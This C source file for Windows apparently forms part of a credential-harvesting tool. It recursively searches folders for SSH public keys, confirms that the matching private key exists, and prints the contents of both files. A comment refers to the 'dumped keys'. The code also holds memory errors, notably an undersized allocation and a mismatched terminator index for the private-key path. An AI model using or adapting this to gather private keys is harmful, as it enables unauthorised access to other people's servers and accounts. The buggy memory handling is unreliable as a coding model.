#include <stdio.h>
#include <string.h>
#include <windows.h>

#include "extract_file.h"
#include "find_ssh_key.h"

static void find_keys_pair(const char *directory, const char *pkName, size_t lenPkFile,\
                          sshkey keysTab[MAX_KEY_FILES], DWORD32 * index){
    char * skName = malloc(sizeof(char) * lenPkFile - 3);
    if (skName == NULL){
        printf("[Error] find_key_pair: malloc for skName failed.\n");
        return;
    }

    char skNamePath[MAX_PATH];
    char pkNamePath[MAX_PATH];

    // Copying the public key file into secret key
    // And removing the .pub
    strncpy(skName, pkName, lenPkFile - 4);
    skName[lenPkFile - 4] = '\0';

    // Getting the path name of the ssh keys
    snprintf(skNamePath, sizeof(skNamePath), "%s\\%s", directory, skName);
    snprintf(pkNamePath, sizeof(pkNamePath), "%s\\%s", directory, pkName);

    free(skName);

    // Checking if the secret key exists
    DWORD attributes = GetFileAttributesA(skNamePath);
    if (attributes == INVALID_FILE_ATTRIBUTES || (attributes & FILE_ATTRIBUTE_DIRECTORY)){
        printf("[ERROR] find_key_pair: couldn't find private key for %s\n", pkNamePath);
        return;
    }

    DWORD32 lenPkNamePath = strlen(pkNamePath);
    DWORD32 lenSkNamePath = strlen(skNamePath);

    // Copying the keys path name if we got the secret and the public keys
    keysTab[*index].publicKeyPath = malloc(sizeof(char) * (lenPkNamePath + 1));
    strncpy(keysTab[*index].publicKeyPath, pkNamePath, lenPkNamePath);
     keysTab[*index].publicKeyPath[lenPkNamePath] = '\0';

    keysTab[*index].secretKeyPath = malloc(sizeof(char) * strlen(skNamePath));
    strncpy(keysTab[*index].secretKeyPath, skNamePath, lenSkNamePath);
    keysTab[*index].secretKeyPath[lenPkNamePath] = '\0';

    printf("[DEBUG] find_key_pair: Keys pair found: \nindex = %u\n\t%s\n\t%s\n\n", *index, keysTab[*index].publicKeyPath, keysTab[*index].secretKeyPath);

    // incrementing the index
    (*index)++;

}

static void find_ssh_key_recursively(const char *directory, sshkey keysFilenamesTab[MAX_KEY_FILES], DWORD32 *indexKeysTab) {
  WIN32_FIND_DATA findData;
  HANDLE hFind;
  char searchPath[MAX_PATH];
  // Building search path
  snprintf(searchPath, sizeof(searchPath), "%s\\*", directory);

  // Searching recursively
  hFind = FindFirstFile(searchPath, &findData);
  if (hFind == INVALID_HANDLE_VALUE) {
    return;
  }

  // Looping on all the file
  do {
    const char *fileName = findData.cFileName;

    // Ignore "." and ".."
    if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
      continue;
    }

    // Check the filetype (file or directory)
    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
      char subDirectory[MAX_PATH];
      snprintf(subDirectory, sizeof(subDirectory), "%s\\%s", directory,
               fileName);

      // Repeat the process on the subdirectories
      find_ssh_key_recursively(subDirectory, keysFilenamesTab, indexKeysTab);
    } else {
      size_t lenFileName = strlen(fileName);
      
      // checking if the end of the file is .pub
      // i.e. ssh public key
      // also checking if we can store more keys
      if (*indexKeysTab >= MAX_KEY_FILES){
        break;
      }
      else if (strcmp(fileName + (lenFileName - 4), ".pub") == 0) {
        find_keys_pair(directory, fileName, lenFileName,\ 
        keysFilenamesTab, indexKeysTab);
      }
    }
  } while (FindNextFile(hFind, &findData) != 0);
  FindClose(hFind);
}

void find_ssh_key(const char * directory){

  sshkey keysFilenamesTab[MAX_KEY_FILES] = {0};
  DWORD32 indexKeysTab = 0;
  find_ssh_key_recursively(directory, keysFilenamesTab, &indexKeysTab);
  DWORD32 lenKeysTab = indexKeysTab;

  // Code part where we process with the dumped keys filenames.
  // here we just print the file
  for (unsigned int i = 0; i < lenKeysTab; i++) {
    print_file(keysFilenamesTab[i].publicKeyPath);
    print_file(keysFilenamesTab[i].secretKeyPath);
  }
}